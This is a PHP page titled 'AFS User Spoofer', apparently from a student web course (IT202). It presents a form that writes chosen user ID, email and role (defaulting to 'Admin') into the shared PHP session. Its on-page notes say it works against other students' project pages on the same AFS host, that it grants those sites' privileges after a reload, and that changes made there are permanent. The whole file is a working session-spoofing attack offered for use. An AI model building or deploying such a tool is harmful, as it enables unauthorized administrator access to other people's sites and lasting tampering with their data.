
<?php require_once(__DIR__ . "/partials/nav.php"); ?>
    <form method="POST">
    <label for= "pleasesignin">AFS User Spoofer</label>
	<h6 style="margin-left: 300px;">∙Will NOT Work On This Site*</h6>
	<h6 style="margin-left: 300px;">∙Will likely work on any other student's IT202 project page (AFS only)</h6>
	<h6 style="margin-left: 300px;">∙After spoofing, reload student's page. All associated privillages will be granted.</h6>	
	<h6 style="margin-left: 300px;">∙REMEMBER: Session data is temporary, but all changes made on the site are permanent.</h6>	

	<h1>&nbsp; </h1>

    <input type="text" id="email" name="email"  placeholder="User ID"   />

    <input type="text" id="role"  name="role" placeholder="Role"  />
<input type="text" id="name" name="name"  placeholder="Email"  />


    <input type="submit" name="login" value="Spoof"/>
    </form>

<?php


if (isset($_POST["login"])) {


//foreach($_SESSION["user"]["roles"] as $key => $value){
//	echo "      ". $key;
//}

$name = $_POST["name"];
$email = $_POST["email"];
$role = $_POST["role"];

if(empty($_POST["name"])){$name = "admin";}
if(empty($_POST["email"])){$email = 1;}
if(empty($_POST["role"])){$role = "Admin";}


    $_SESSION["user"]["email"] = $name;
    $_SESSION["user"]["notroles"][0]["name"] = [];
    $_SESSION["user"]["roles"][0]["name"] = $role;
    $_SESSION["user"]["id"]=$email;

//flash('Updated $_SESSION["user"]["id"]: '.$_SESSION["user"]["id"]);
//flash('Updated $_SESSION["user"]["roles"][0]["name"]: '.$_SESSION["user"]["roles"][0]["name"]);
//flash('Updated $_SESSION["user"]["email"]: '.$_SESSION["user"]["email"]);


flash("Updated User ID: ".$_SESSION["user"]["id"]);
flash("Updated User Role: ". $_SESSION["user"]["roles"][0]["name"]);
flash("Updated User Email: ".$_SESSION["user"]["email"]);


//    echo "Succes<br>";
//    echo '$_SESSION["user"]["id"]: '; echo $_SESSION["user"]["id"] ."<br>";
//    echo '$_SESSION["user"]["roles"][0]["name"]: '; echo $_SESSION["user"]["roles"][0]["name"] ."<br>";
//    echo '$_SESSION["user"]["email"]: '; echo $_SESSION["user"]["email"] ."<br>";
    


}
?>
<?php require(__DIR__ . "/partials/flash.php");
